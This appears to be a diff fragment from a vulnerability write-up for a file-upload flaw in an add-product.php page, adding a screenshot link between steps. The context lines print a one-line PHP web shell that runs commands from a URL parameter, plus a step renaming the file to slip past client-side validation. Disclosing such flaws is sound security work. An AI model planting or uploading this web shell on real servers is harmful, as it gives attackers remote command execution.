@@ -16,6 +16,8 @@ Locate L27-L52 of add-product.php source code
 
 Prepare payload (shell.php):
 
+![image](https://github.com/user-attachments/assets/dc74f9a6-3e63-4b79-aff3-038b493c1efd)
+
 <?php system($_GET['cmd']); ?>
 
 Rename the file to bypass client-side validation:
